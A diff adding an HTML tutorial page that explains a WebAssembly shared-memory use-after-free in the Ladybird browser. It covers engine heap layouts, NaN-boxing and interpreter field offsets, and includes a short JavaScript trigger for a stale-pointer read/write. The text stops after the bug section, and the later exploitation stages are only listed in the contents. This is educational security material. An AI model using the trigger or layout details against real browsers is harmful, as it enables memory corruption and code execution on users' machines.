@@ -1,0 +1,1282 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>From a stale pointer to uname -a: exploiting Ladybird's WebAssembly UAF</title>
+<style>
+  :root {
+    --bg: #fdfdfc; --fg: #1a1a1a; --accent: #c0392b; --accent2: #2471a3;
+    --code-bg: #f4f1ed; --note-bg: #fef9e7; --dead-bg: #fadbd8;
+    --ok: #1e8449; --mono: ui-monospace, "SF Mono", Menlo, Consolas, monospace;
+  }
+  body {
+    font-family: -apple-system, "Segoe UI", system-ui, sans-serif;
+    max-width: 880px; margin: 2em auto; padding: 0 1.5em;
+    background: var(--bg); color: var(--fg); line-height: 1.6; font-size: 16px;
+  }
+  h1 { font-size: 1.9em; border-bottom: 3px solid var(--accent); padding-bottom: .3em; }
+  h2 { font-size: 1.5em; color: var(--accent); margin-top: 2.2em;
+       border-bottom: 1px solid #ddd; padding-bottom: .2em; }
+  h3 { font-size: 1.2em; color: var(--accent2); margin-top: 1.8em; }
+  h4 { font-size: 1.05em; }
+  code, pre { font-family: var(--mono); font-size: 0.92em; }
+  code { background: var(--code-bg); padding: 1px 5px; border-radius: 3px; }
+  pre { background: var(--code-bg); padding: 1em; border-radius: 6px;
+        overflow-x: auto; line-height: 1.45; border-left: 3px solid #ccc; }
+  pre code { background: none; padding: 0; }
+  pre.cpp { border-left-color: #6c3483; }
+  pre.js  { border-left-color: #b9770e; }
+  pre.asm { border-left-color: #1f618d; }
+  pre.out { border-left-color: var(--ok); background: #eafaf1; }
+  .note, .deadend, .analogy, .key {
+    padding: .8em 1.1em; margin: 1.2em 0; border-radius: 6px; border-left: 4px solid;
+  }
+  .note    { background: var(--note-bg); border-color: #d4ac0d; }
+  .note::before { content: "📝 Note: "; font-weight: bold; }
+  .deadend { background: var(--dead-bg); border-color: var(--accent); }
+  .deadend::before { content: "💀 Dead end: "; font-weight: bold; color: var(--accent); }
+  .analogy { background: #eaf2f8; border-color: var(--accent2); }
+  .analogy::before { content: "💡 Analogy: "; font-weight: bold; color: var(--accent2); }
+  .key     { background: #e8f8f5; border-color: var(--ok); }
+  .key::before { content: "🔑 Key insight: "; font-weight: bold; color: var(--ok); }
+  svg { display: block; margin: 1.2em auto; max-width: 100%; }
+  svg text { font-family: var(--mono); font-size: 12px; }
+  .toc { background: #f8f9f9; padding: 1em 1.5em; border-radius: 6px;
+         column-count: 2; column-gap: 2em; font-size: 0.95em; }
+  .toc a { text-decoration: none; color: var(--accent2); }
+  .toc a:hover { text-decoration: underline; }
+  table.layout { border-collapse: collapse; margin: 1em auto; font-family: var(--mono); font-size: 0.88em; }
+  table.layout td, table.layout th { border: 1px solid #bbb; padding: 4px 10px; text-align: left; }
+  table.layout th { background: #eee; }
+  table.layout .ctrl { background: #d5f5e3; }
+  table.layout .need { background: #fdebd0; }
+  .caption { text-align: center; font-style: italic; color: #666; margin-top: -.6em; font-size: 0.9em; }
+  .stage { display:inline-block; background:var(--accent); color:#fff; border-radius:12px;
+           padding:2px 12px; font-weight:bold; font-size:.85em; margin-right:.5em; }
+</style>
+</head>
+<body>
+
+<h1>From a stale pointer to <code>uname&nbsp;-a</code><br>
+<small style="font-size:.55em;color:#666">Exploiting a WebAssembly shared-memory UAF in the Ladybird browser, explained for systems programmers</small></h1>
+
+<p>This is a complete walkthrough of turning a single use-after-free in Ladybird's
+WebAssembly implementation into native code execution that calls <code>uname(2)</code>
+and renders the result on the page. It is written for people who know C/C++ and how
+processes and heaps work, but have <em>never</em> done browser or JavaScript-engine
+exploitation. Every dead end is documented, because the dead ends are where the
+learning happens.</p>
+
+<p>Ladybird is an unusually good target for learning this material precisely because
+it has none of the defensive layers that production engines have grown over the past
+decade: no pointer authentication, no heap cage, no external-pointer tables, no CFI,
+no renderer sandbox. The chain you'll read here is the <em>textbook</em> chain
+(UAF&nbsp;→ addrof/fakeobj&nbsp;→ arb&nbsp;R/W&nbsp;→ function-pointer hijack), the
+one every JSC and V8 writeup from 2014-2018 starts from before spending forty pages
+on mitigation bypasses. Here you get to see each rung of the ladder doing exactly what
+it says on the tin. <a href="#s11">Section&nbsp;11</a> walks through which step would
+have failed where on modern Safari and Chrome.</p>
+
+<div class="toc">
+<a href="#s0">0. The 30-second version</a><br>
+<a href="#s1">1. Background you actually need</a><br>
+<a href="#s2">2. The bug</a><br>
+<a href="#s3">3. What the bug gives us (and what it doesn't)</a><br>
+<a href="#s4">4. addrof / fakeobj: the <code>apply</code>+Proxy trick</a><br>
+<a href="#s5">5. Bootstrapping arbitrary read/write</a><br>
+<a href="#s6">6. Making it stable: the two-array trampoline</a><br>
+<a href="#s7">7. Calling native code</a><br>
+<a href="#s8">8. Cleanup and reliability engineering</a><br>
+<a href="#s9">9. Graveyard of failed approaches</a><br>
+<a href="#s10">10. Lessons</a><br>
+<a href="#s11">11. Why this exact chain dies on Safari and Chrome</a><br>
+</div>
+
+<!-- ==================================================================== -->
+<h2 id="s0">0. The 30-second version</h2>
+
+<svg viewBox="0 0 820 120">
+  <defs>
+    <marker id="arr" markerWidth="8" markerHeight="8" refX="7" refY="3" orient="auto">
+      <path d="M0,0 L7,3 L0,6 Z" fill="#555"/>
+    </marker>
+  </defs>
+  <g font-size="11">
+    <rect x="5"   y="30" width="120" height="50" rx="6" fill="#fdebd0" stroke="#b9770e"/>
+    <text x="65"  y="50" text-anchor="middle">UAF: stale</text>
+    <text x="65"  y="64" text-anchor="middle">Uint32Array</text>
+    <line x1="125" y1="55" x2="160" y2="55" stroke="#555" marker-end="url(#arr)"/>
+
+    <rect x="160" y="30" width="120" height="50" rx="6" fill="#d6eaf8" stroke="#2471a3"/>
+    <text x="220" y="50" text-anchor="middle">addrof /</text>
+    <text x="220" y="64" text-anchor="middle">fakeobj</text>
+    <line x1="280" y1="55" x2="315" y2="55" stroke="#555" marker-end="url(#arr)"/>
+
+    <rect x="315" y="30" width="120" height="50" rx="6" fill="#d5f5e3" stroke="#1e8449"/>
+    <text x="375" y="50" text-anchor="middle">1-byte</text>
+    <text x="375" y="64" text-anchor="middle">arb R/W</text>
+    <line x1="435" y1="55" x2="470" y2="55" stroke="#555" marker-end="url(#arr)"/>
+
+    <rect x="470" y="30" width="120" height="50" rx="6" fill="#d5f5e3" stroke="#1e8449"/>
+    <text x="530" y="50" text-anchor="middle">full 48-bit</text>
+    <text x="530" y="64" text-anchor="middle">arb R/W</text>
+    <line x1="590" y1="55" x2="625" y2="55" stroke="#555" marker-end="url(#arr)"/>
+
+    <rect x="625" y="30" width="180" height="50" rx="6" fill="#fadbd8" stroke="#c0392b"/>
+    <text x="715" y="50" text-anchor="middle">hijack fn-ptr →</text>
+    <text x="715" y="64" text-anchor="middle">uname(VM*)</text>
+  </g>
+</svg>
+
+<ol>
+<li>A <code>Uint32Array</code> keeps a raw pointer into a freed 128&nbsp;KiB heap block.</li>
+<li>We make the engine reallocate that exact block as an array of JavaScript values, so the
+    same bytes are simultaneously "raw u32s" to one view and "object pointers" to another
+    &rarr; <b>addrof</b> and <b>fakeobj</b>.</li>
+<li>We forge a pointer to the <em>middle</em> of two adjacent objects so the interpreter's
+    typed-array fast path reads the wrong fields &rarr; a 1-byte read/write anywhere.</li>
+<li>We use that to corrupt two real <code>Uint32Array</code>s into a self-retargeting pair
+    &rarr; clean 32-bit read/write at any 48-bit address.</li>
+<li>We overwrite a built-in function's C function pointer with <code>uname</code>, call it
+    from JS, and read the kernel version string out of the engine's own memory.</li>
+</ol>
+
+<!-- ==================================================================== -->
+<h2 id="s1">1. Background you actually need</h2>
+
+<p>You can skip any subsection you already know. Everything else in this writeup leans on
+these five concepts.</p>
+
+<h3 id="s1.1">1.1 Two heaps, not one</h3>
+
+<p>A JS engine manages two completely separate kinds of heap memory:</p>
+
+<svg viewBox="0 0 760 220">
+  <rect x="20" y="20" width="340" height="180" rx="8" fill="#eaf2f8" stroke="#2471a3" stroke-width="2"/>
+  <text x="190" y="40" text-anchor="middle" font-weight="bold">GC heap (LibGC)</text>
+  <text x="190" y="58" text-anchor="middle" font-size="10">mmap'd 16 KiB "HeapBlocks"</text>
+  <rect x="40" y="70" width="80" height="20" fill="#aed6f1" stroke="#2471a3"/><text x="80" y="84" text-anchor="middle" font-size="10">Object</text>
+  <rect x="125" y="70" width="80" height="20" fill="#aed6f1" stroke="#2471a3"/><text x="165" y="84" text-anchor="middle" font-size="10">Array</text>
+  <rect x="210" y="70" width="80" height="20" fill="#aed6f1" stroke="#2471a3"/><text x="250" y="84" text-anchor="middle" font-size="10">Uint32Array</text>
+  <rect x="40" y="95" width="80" height="20" fill="#aed6f1" stroke="#2471a3"/><text x="80" y="109" text-anchor="middle" font-size="10">String</text>
+  <rect x="125" y="95" width="80" height="20" fill="#aed6f1" stroke="#2471a3"/><text x="165" y="109" text-anchor="middle" font-size="10">Function</text>
+  <rect x="210" y="95" width="80" height="20" fill="#aed6f1" stroke="#2471a3"/><text x="250" y="109" text-anchor="middle" font-size="10">Shape</text>
+  <text x="190" y="135" text-anchor="middle" font-size="10">fixed-size cells, type-segregated,</text>
+  <text x="190" y="149" text-anchor="middle" font-size="10">mark-sweep, never moves</text>
+  <text x="190" y="170" text-anchor="middle" font-size="10" fill="#2471a3">addresses ≈ 0x14X_XXXX_XXXX</text>
+
+  <rect x="400" y="20" width="340" height="180" rx="8" fill="#fef5e7" stroke="#b9770e" stroke-width="2"/>
+  <text x="570" y="40" text-anchor="middle" font-weight="bold">malloc heap (mimalloc)</text>
+  <text x="570" y="58" text-anchor="middle" font-size="10">size-class bins, 32 MiB segments</text>
+  <rect x="420" y="70" width="135" height="20" fill="#fad7a0" stroke="#b9770e"/><text x="487" y="84" text-anchor="middle" font-size="10">ArrayBuffer backing</text>
+  <rect x="560" y="70" width="160" height="20" fill="#fad7a0" stroke="#b9770e"/><text x="640" y="84" text-anchor="middle" font-size="10">array element storage</text>
+  <rect x="420" y="95" width="135" height="20" fill="#fad7a0" stroke="#b9770e"/><text x="487" y="109" text-anchor="middle" font-size="10">Vector&lt;T&gt; buffers</text>
+  <rect x="560" y="95" width="160" height="20" fill="#fad7a0" stroke="#b9770e"/><text x="640" y="109" text-anchor="middle" font-size="10">wasm linear memory</text>
+  <text x="570" y="135" text-anchor="middle" font-size="10">variable-size, freed with free(),</text>
+  <text x="570" y="149" text-anchor="middle" font-size="10">reused by next same-size alloc</text>
+  <text x="570" y="170" text-anchor="middle" font-size="10" fill="#b9770e">addresses ≈ 0x5E9_XXXX_XXXX</text>
+</svg>
+
+<p>A <code>Uint32Array</code> object (the thing with a vtable, a shape, a length) lives
+in the <b>GC heap</b>. The 64&nbsp;KiB of actual numbers it indexes into live in the
+<b>malloc heap</b>. The object holds a raw pointer across that boundary. <em>Our bug is a
+stale copy of that pointer.</em></p>
+
+<div class="key">A use-after-free in the malloc heap can only ever be reclaimed by another
+malloc-heap allocation of the same size class. You cannot make a GC cell land there. This
+single fact drove half the design decisions in this exploit.</div>
+
+<h3 id="s1.2">1.2 NaN-boxing: how JS fits a pointer and a type tag into 8 bytes</h3>
+
+<p>Every JS value (number, string, object, <code>undefined</code>) is stored as a single
+64-bit word. The trick: IEEE-754 doubles have 2<sup>52</sup>−2 unused NaN bit patterns.
+The engine claims a slice of NaN-space for tagged pointers:</p>
+
+<svg viewBox="0 0 700 130">
+  <rect x="20" y="20" width="120" height="30" fill="#f5b7b1" stroke="#922b21"/>
+  <text x="80" y="40" text-anchor="middle">tag (16 bits)</text>
+  <rect x="140" y="20" width="540" height="30" fill="#aed6f1" stroke="#1a5276"/>
+  <text x="410" y="40" text-anchor="middle">payload (48 bits)</text>
+  <text x="20" y="15" font-size="10">63</text><text x="135" y="15" font-size="10">48</text><text x="675" y="15" font-size="10">0</text>
+
+  <text x="30" y="78" font-size="11"><tspan font-weight="bold">0xFFF9</tspan> = Object → payload is a GC cell pointer</text>
+  <text x="30" y="94" font-size="11"><tspan font-weight="bold">0xFFFA</tspan> = String &nbsp; <tspan font-weight="bold">0x7FFA</tspan> = Int32 &nbsp; <tspan font-weight="bold">0x7FFE</tspan> = undefined</text>
+  <text x="30" y="110" font-size="11"><tspan font-weight="bold">anything else</tspan> = the 64 bits are a literal IEEE double</text>
+</svg>
+
+<p>Consequence: if you can read the raw 8 bytes where a JS value is stored, the low 48 bits
+of an object value <em>are</em> its heap address. And if you can write those 8 bytes, you
+can make JS believe any address you choose is a valid object. Those two operations have
+names:</p>
+<ul>
+<li><b>addrof(obj)</b>: given a JS object, learn its address.</li>
+<li><b>fakeobj(addr)</b>: given an address, get a JS reference that the engine treats as an object living there.</li>
+</ul>
+
+<div class="analogy">Think of NaN-boxing as a tagged union packed into a double. <code>addrof</code>
+is "read the union as raw bytes"; <code>fakeobj</code> is "write raw bytes and read them back through
+the union's <code>object</code> arm." Neither is supposed to be possible from JS, that's
+the whole game.</div>
+
+<h3 id="s1.3">1.3 The asm interpreter fast path: why field offsets matter more than vtables</h3>
+
+<p>Ladybird's bytecode interpreter is hand-written assembly. For hot operations like
+<code>array[i]</code> it does <em>not</em> call a C++ virtual method, it reads a few bytes
+at hard-coded offsets and dispatches inline. Here is the typed-array element load,
+annotated:</p>
+
+<pre class="asm"><code>.try_typed_array:
+    ; t3 = the object pointer we just unboxed
+    ldr  x5, [x3, #104]      ; ← TYPED_ARRAY_CACHED_DATA_PTR  (m_data)
+    cbz  x5, .slow           ;   null → not cached, bail
+    ldr  w0, [x3, #68]       ; ← TYPED_ARRAY_ARRAY_LENGTH_VALUE
+    cmp  w4, w0              ;   index &lt; length?
+    b.hs .slow
+    ldrb w0, [x3, #92]       ; ← TYPED_ARRAY_KIND  (0=Uint8, 3=Uint32, …)
+    ...
+    ldrb w0, [x5, x4]        ;   *(m_data + index) , that's it</code></pre>
+
+<p>Notice what it does <b>not</b> check: the vtable, the shape, the prototype, whether the
+object is even a real <code>TypedArray</code>. It checks <em>one bit</em> in a flags byte at
+offset&nbsp;10, then trusts four fields. This is the security/performance trade-off that
+every JIT and asm-interpreter makes, and it is what lets a forged object work without
+forging a whole class hierarchy.</p>
+
+<table class="layout">
+<tr><th>offset</th><th>field</th><th>fast path reads it as</th></tr>
+<tr class="need"><td>+10</td><td><code>m_flags</code></td><td>bit 3 set? → "this is a typed array"</td></tr>
+<tr class="need"><td>+68</td><td><code>m_array_length</code></td><td>u32 bound check</td></tr>
+<tr class="need"><td>+92</td><td><code>m_kind</code></td><td>u8: which element type</td></tr>
+<tr class="need"><td>+104</td><td><code>m_data</code></td><td>raw pointer, dereferenced blindly</td></tr>
+</table>
+<p class="caption">The four fields the asm fast path trusts. Forge these, and <code>fake[0]</code> reads or writes wherever you point <code>m_data</code>.</p>
+
+<h3 id="s1.4">1.4 The <code>Object</code> cell layout</h3>
+
+<p>Every plain <code>{}</code> object is a 64-byte GC cell. We will be abusing the
+<em>exact byte offsets</em> of its members later, so here they are once:</p>
+
+<table class="layout">
+<tr><th>off</th><th>size</th><th>field</th><th>notes</th></tr>
+<tr><td>0</td><td>8</td><td>vtable</td><td>points into liblagom-js __DATA</td></tr>
+<tr><td>8</td><td>2</td><td>GC cell header</td><td>state, mark bit</td></tr>
+<tr><td>10</td><td>1</td><td><code>m_flags</code></td><td>IsTypedArray=8, MayInterfere=16, IsFunction=128, …</td></tr>
+<tr><td>11</td><td>1</td><td><code>m_indexed_storage_kind</code></td><td>0=None 1=Packed 2=Holey 3=Dict</td></tr>
+<tr><td>12</td><td>4</td><td><code>m_indexed_array_like_size</code></td><td></td></tr>
+<tr><td>16</td><td>8</td><td><code>m_shape</code></td><td>GC ptr</td></tr>
+<tr><td>24</td><td>8</td><td><code>m_named_properties</code></td><td>→ +48 if ≤2 props (inline)</td></tr>
+<tr><td>32</td><td>8</td><td><code>m_indexed_elements</code></td><td>malloc ptr or null</td></tr>
+<tr><td>40</td><td>8</td><td><code>m_private_elements</code></td><td>null for plain objects</td></tr>
+<tr class="ctrl"><td>48</td><td>8</td><td><code>m_inline_named_storage[0]</code></td><td><b>= obj.a</b> (first named prop)</td></tr>
+<tr class="ctrl"><td>56</td><td>8</td><td><code>m_inline_named_storage[1]</code></td><td><b>= obj.b</b> (second named prop)</td></tr>
+</table>
+<p class="caption">The green rows are the only bytes of a plain <code>{}</code> that JavaScript can set to fully arbitrary values.</p>
+
+<h3 id="s1.5">1.5 mimalloc size classes (the part that bit us)</h3>
+
+<p>mimalloc bins allocations by size. A freed block is only ever reused for a request in the
+<em>same bin</em>. The bin boundary that matters here:</p>
+
+<ul>
+<li>≤ 64&nbsp;KiB → "medium": several blocks share a page, intra-page free lists.</li>
+<li>&gt; 64&nbsp;KiB → "large": <b>one block per page</b>. When freed, the whole page is
+    returned to the segment. There is no free-list link to leak.</li>
+</ul>
+
+<p>Our freed block is 128&nbsp;KiB, large. To reclaim it, we must trigger another
+≈128&nbsp;KiB malloc. To leak its address via a free-list pointer, we'd need it to be
+medium. It isn't. (We tried. See <a href="#s9">§9</a>.)</p>
+
+<h3>1.6 <code>Proxy</code> and "traps"</h3>
+
+<p><code>Proxy</code> is a standard JavaScript built-in that wraps an object and lets you
+intercept every fundamental operation on it with your own functions. The spec calls those
+interceptor functions <em>traps</em>: the <code>get</code> trap intercepts property reads,
+<code>set</code> intercepts writes, <code>has</code> intercepts <code>in</code>, and so
+on.</p>
+
+<pre class="js"><code>const p = new Proxy({}, {
+  get(target, key) { console.log('read', key); return 42; }
+});
+p.length;   // prints "read length", evaluates to 42
+p[0];       // prints "read 0",      evaluates to 42
+p[1];       // prints "read 1",      evaluates to 42</code></pre>
+
+<p>The reason this matters for exploitation: a <code>Proxy</code> is the only way in
+JavaScript to make <code>obj.length</code> and <code>obj[i]</code> run <em>arbitrary user
+code synchronously</em>. A real array hands back its elements without re-entering JS. Any
+spec algorithm that loops "read <code>.length</code>, then read <code>[0]</code>,
+<code>[1]</code>, &hellip;" therefore turns into a stream of attacker callbacks if you feed
+it a <code>Proxy</code>, interleaved with whatever the engine is doing between reads. §4
+abuses exactly that.</p>
+
+<!-- ==================================================================== -->
+<h2 id="s2">2. The bug</h2>
+
+<p>WebAssembly's <code>Memory</code> object owns a growable byte buffer. When you ask for it
+from JS you get a <code>SharedArrayBuffer</code>, and you can wrap that in a
+<code>Uint32Array</code> to poke at the bytes. For speed, the typed-array caches a raw
+pointer to the buffer's data:</p>
+
+<pre class="cpp"><code>// TypedArrayBase
+u8* m_data;   // = buffer.data() + byte_offset
+              // asm fast path reads this directly</code></pre>
+
+<p>When the wasm memory <em>grows</em>, the underlying <code>ByteBuffer</code> may
+<code>realloc</code>, old block freed, new block elsewhere. Every cached <code>m_data</code>
+must be refreshed. Here is the refresh logic:</p>
+
+<pre class="cpp"><code>// Memory::refresh_the_memory_buffer(), simplified
+if (!buffer-&gt;is_shared_array_buffer()) {
+    detach_array_buffer(*buffer);                       // non-shared: detach (nulls views)
+} else {
+    buffer-&gt;refresh_cached_typed_array_view_data_pointers();   // shared: refresh views
+}
+buffer = create_a_fixed_length_memory_buffer(...);      // ← then REPLACE m_buffer</code></pre>
+
+<p>The bug is the last line. <code>m_buffer</code> is replaced with a fresh wrapper after
+every grow. So on the <em>second</em> grow, <code>refresh_…()</code> runs on the
+<em>second</em> wrapper (which has no views) and the views on the <em>first</em> wrapper
+are forgotten. They keep their old <code>m_data</code>.</p>
+
+<pre class="js"><code>// wasm page = 64 KiB; grow(n) grows BY n pages
+// t=1
+const mem  = new WebAssembly.Memory({initial: 1, maximum: 1000, shared: true});
+                                       // 1 page  = 64 KiB ByteBuffer @ A
+const bufA = mem.buffer;
+const viewA = new Uint32Array(bufA);   // viewA.m_data = A (cached raw u8*)
+// t=2
+mem.grow(1);                           // 64K → 128K: alloc @ X, free A.
+                                       //   refresh runs on bufA → viewA.m_data = X ✓
+                                       //   then m_buffer ← bufB
+// t=3
+mem.grow(100);                         // 128K → 102·64K ≈ 6.4M: alloc @ Z, FREE X.
+                                       //   refresh runs on bufB (no views) → viewA.m_data = X ✗ stale
+viewA[0];                              // UAF read  @ X  (freed 131 072-byte block)
+viewA[0] = 0x41414141|0;               // UAF write @ X</code></pre>
+
+<p>The two grows must be separate calls: a single <code>grow(101)</code> would refresh
+<code>viewA.m_data</code> straight to Z and nothing would dangle. The <code>100</code> is
+arbitrary; any nonzero second grow crosses a mimalloc size-class boundary and forces X to be
+freed. The freed block is exactly 131&nbsp;072 bytes, which is the magic number behind every
+reclaim allocation from §4 onward.</p>
+
+<p>Three pointers are in play and the bug only makes sense if you keep them apart:</p>
+<table class="layout" style="font-family:inherit;font-size:0.9em">
+<tr><th>field</th><th>on</th><th>type</th><th>role</th></tr>
+<tr><td><code>m_buffer</code></td><td><code>Memory</code></td><td><code>GC::Ptr&lt;SharedArrayBuffer&gt;</code></td>
+    <td>which wrapper <code>mem.buffer</code> returns; <b>replaced after every grow</b>; the
+        refresh runs on whatever this points at</td></tr>
+<tr><td><code>m_viewed_array_buffer</code></td><td><code>viewA</code></td><td><code>GC::Ptr&lt;SharedArrayBuffer&gt;</code></td>
+    <td>which wrapper <code>viewA</code> was created on; <code>viewA</code> is in <i>that</i>
+        wrapper's <code>m_cached_views</code> set; <b>never changes</b></td></tr>
+<tr><td><code>m_data</code></td><td><code>viewA</code></td><td>raw <code>u8*</code></td>
+    <td>cached pointer straight into the malloc'd bytes; what the asm fast path dereferences</td></tr>
+</table>
+
+<svg viewBox="0 0 820 470">
+  <style>.lab{font-size:11px}.small{font-size:10px}.tiny{font-size:9px}</style>
+  <defs>
+    <marker id="a2" markerWidth="8" markerHeight="8" refX="7" refY="3" orient="auto">
+      <path d="M0,0 L7,3 L0,6 Z" fill="#555"/></marker>
+    <marker id="a2b" markerWidth="8" markerHeight="8" refX="7" refY="3" orient="auto">
+      <path d="M0,0 L7,3 L0,6 Z" fill="#2471a3"/></marker>
+    <marker id="a2r" markerWidth="8" markerHeight="8" refX="7" refY="3" orient="auto">
+      <path d="M0,0 L7,3 L0,6 Z" fill="#c0392b"/></marker>
+    <marker id="a2g" markerWidth="8" markerHeight="8" refX="7" refY="3" orient="auto">
+      <path d="M0,0 L7,3 L0,6 Z" fill="#1e8449"/></marker>
+  </defs>
+
+  <!-- legend -->
+  <line x1="490" y1="10" x2="520" y2="10" stroke="#888" stroke-width="1.5" marker-end="url(#a2)"/>
+    <text x="526" y="13" class="tiny" fill="#666">Memory.m_buffer (which wrapper)</text>
+  <line x1="490" y1="24" x2="520" y2="24" stroke="#2471a3" stroke-width="1.5" stroke-dasharray="4 3" marker-end="url(#a2b)"/>
+    <text x="526" y="27" class="tiny" fill="#2471a3">viewA registered on (m_viewed_array_buffer)</text>
+  <line x1="490" y1="38" x2="520" y2="38" stroke="#1e8449" stroke-width="2" marker-end="url(#a2g)"/>
+    <text x="526" y="41" class="tiny" fill="#1e8449">viewA.m_data (raw u8*, what asm reads)</text>
+
+  <!-- ================= t=1 ================= -->
+  <text x="10" y="62" class="lab"><tspan font-weight="bold">t=1</tspan>  new Memory({initial:1, shared:true});  viewA = new Uint32Array(mem.buffer)</text>
+  <g transform="translate(0,72)">
+    <rect x="20"  y="0"  width="60" height="26" fill="#d6eaf8" stroke="#1a5276"/><text x="50"  y="17" text-anchor="middle" class="small">Memory</text>
+    <rect x="130" y="0"  width="50" height="26" fill="#e8daef" stroke="#6c3483"/><text x="155" y="17" text-anchor="middle" class="small">bufA</text>
+    <rect x="20"  y="36" width="60" height="26" fill="#aed6f1" stroke="#1a5276"/><text x="50"  y="53" text-anchor="middle" class="small">viewA</text>
+    <rect x="280" y="16" width="120" height="26" fill="#fcf3cf" stroke="#b9770e"/><text x="340" y="33" text-anchor="middle" class="small">ByteBuffer</text>
+    <rect x="460" y="16" width="100" height="26" fill="#fad7a0" stroke="#b9770e"/><text x="510" y="33" text-anchor="middle" class="small">64K @ A</text>
+    <line x1="80"  y1="13" x2="130" y2="13" stroke="#888" stroke-width="1.5" marker-end="url(#a2)"/>
+    <line x1="80"  y1="49" x2="130" y2="20" stroke="#2471a3" stroke-width="1.5" stroke-dasharray="4 3" marker-end="url(#a2b)"/>
+    <line x1="180" y1="13" x2="280" y2="26" stroke="#888" stroke-width="1.2" marker-end="url(#a2)"/>
+    <line x1="400" y1="29" x2="460" y2="29" stroke="#b9770e" stroke-width="1.2" marker-end="url(#a2)"/>
+    <path d="M80,55 Q260,80 460,35" fill="none" stroke="#1e8449" stroke-width="2" marker-end="url(#a2g)"/>
+    <text x="260" y="78" text-anchor="middle" class="small" fill="#1e8449">m_data = A ✓</text>
+  </g>
+
+  <!-- ================= t=2 ================= -->
+  <text x="10" y="180" class="lab"><tspan font-weight="bold">t=2</tspan>  mem.grow(1)  →  ByteBuffer 64K→128K;  refresh(<tspan fill="#6c3483">bufA</tspan>).views;  m_buffer ← bufB</text>
+  <g transform="translate(0,190)">
+    <rect x="20"  y="6"  width="60" height="26" fill="#d6eaf8" stroke="#1a5276"/><text x="50"  y="23" text-anchor="middle" class="small">Memory</text>
+    <rect x="130" y="0"  width="50" height="22" fill="#e8daef" stroke="#6c3483"/><text x="155" y="15" text-anchor="middle" class="small">bufA</text>
+    <rect x="130" y="26" width="50" height="22" fill="#e8daef" stroke="#6c3483"/><text x="155" y="41" text-anchor="middle" class="small">bufB</text>
+    <rect x="20"  y="52" width="60" height="26" fill="#aed6f1" stroke="#1a5276"/><text x="50"  y="69" text-anchor="middle" class="small">viewA</text>
+    <rect x="280" y="16" width="120" height="26" fill="#fcf3cf" stroke="#b9770e"/><text x="340" y="33" text-anchor="middle" class="small">ByteBuffer</text>
+    <rect x="460" y="16" width="120" height="26" fill="#fad7a0" stroke="#b9770e"/><text x="520" y="33" text-anchor="middle" class="small">128K @ X</text>
+    <line x1="80"  y1="19" x2="130" y2="37" stroke="#888" stroke-width="1.5" marker-end="url(#a2)"/>
+    <line x1="80"  y1="65" x2="130" y2="17" stroke="#2471a3" stroke-width="1.5" stroke-dasharray="4 3" marker-end="url(#a2b)"/>
+    <line x1="180" y1="11" x2="280" y2="24" stroke="#888" stroke-width="1.2" marker-end="url(#a2)"/>
+    <line x1="180" y1="37" x2="280" y2="33" stroke="#888" stroke-width="1.2" marker-end="url(#a2)"/>
+    <line x1="400" y1="29" x2="460" y2="29" stroke="#b9770e" stroke-width="1.2" marker-end="url(#a2)"/>
+    <path d="M80,71 Q260,96 460,35" fill="none" stroke="#1e8449" stroke-width="2" marker-end="url(#a2g)"/>
+    <text x="260" y="94" text-anchor="middle" class="small" fill="#1e8449">m_data = X ✓ (refresh walked bufA's view list)</text>
+    <text x="20" y="112" class="tiny" fill="#888">bufA and bufB both point at the same ByteBuffer; bufA→.data() = bufB→.data() = X.</text>
+  </g>
+
+  <!-- ================= t=3 ================= -->
+  <text x="10" y="328" class="lab"><tspan font-weight="bold">t=3</tspan>  mem.grow(100)  →  ByteBuffer 128K→6.4M;  refresh(<tspan fill="#c0392b">bufB</tspan>).views = ∅;  m_buffer ← bufC</text>
+  <g transform="translate(0,338)">
+    <rect x="20"  y="12" width="60" height="26" fill="#d6eaf8" stroke="#1a5276"/><text x="50"  y="29" text-anchor="middle" class="small">Memory</text>
+    <rect x="130" y="0"  width="50" height="20" fill="#e8daef" stroke="#6c3483"/><text x="155" y="14" text-anchor="middle" class="small">bufA</text>
+    <rect x="130" y="22" width="50" height="20" fill="#e8daef" stroke="#6c3483"/><text x="155" y="36" text-anchor="middle" class="small">bufB</text>
+    <rect x="130" y="44" width="50" height="20" fill="#e8daef" stroke="#6c3483"/><text x="155" y="58" text-anchor="middle" class="small">bufC</text>
+    <rect x="20"  y="68" width="60" height="26" fill="#aed6f1" stroke="#1a5276"/><text x="50"  y="85" text-anchor="middle" class="small">viewA</text>
+    <rect x="280" y="22" width="120" height="26" fill="#fcf3cf" stroke="#b9770e"/><text x="340" y="39" text-anchor="middle" class="small">ByteBuffer</text>
+    <rect x="460" y="22" width="140" height="26" fill="#fad7a0" stroke="#b9770e"/><text x="530" y="39" text-anchor="middle" class="small">6.4M @ Z</text>
+    <rect x="640" y="22" width="160" height="26" fill="#f5b7b1" stroke="#922b21" stroke-dasharray="4"/>
+      <text x="720" y="39" text-anchor="middle" class="small" fill="#922b21">128K @ X (freed)</text>
+    <line x1="80"  y1="25" x2="130" y2="54" stroke="#888" stroke-width="1.5" marker-end="url(#a2)"/>
+    <line x1="80"  y1="81" x2="130" y2="16" stroke="#2471a3" stroke-width="1.5" stroke-dasharray="4 3" marker-end="url(#a2b)"/>
+    <line x1="180" y1="10" x2="280" y2="30" stroke="#888" stroke-width="1.2" marker-end="url(#a2)"/>
+    <line x1="180" y1="32" x2="280" y2="34" stroke="#888" stroke-width="1.2" marker-end="url(#a2)"/>
+    <line x1="180" y1="54" x2="280" y2="40" stroke="#888" stroke-width="1.2" marker-end="url(#a2)"/>
+    <line x1="400" y1="35" x2="460" y2="35" stroke="#b9770e" stroke-width="1.2" marker-end="url(#a2)"/>
+    <path d="M80,87 Q360,118 640,42" fill="none" stroke="#c0392b" stroke-width="2.5" marker-end="url(#a2r)"/>
+    <text x="360" y="114" text-anchor="middle" class="small" fill="#c0392b" font-weight="bold">m_data = X ✗ STALE  (bufA was never walked again)</text>
+    <text x="20" y="130" class="tiny" fill="#888">bufA/bufB/bufC → .data() all = Z (correct). Nothing legitimate points at X anymore.</text>
+  </g>
+</svg>
+<p class="caption">Grey = which wrapper <code>Memory</code> tracks. Dashed blue = which
+wrapper <code>viewA</code> is registered on (fixed at <code>bufA</code> forever). Green/red =
+<code>viewA.m_data</code>, the raw pointer the asm fast path actually dereferences. The bug
+is that after t=2 the grey and blue arrows go to different wrappers, so the refresh at t=3
+walks an empty list.</p>
+
+<div class="note">Ladybird does not gate <code>shared:true</code> on cross-origin isolation
+headers, so this triggers from any page.</div>
+
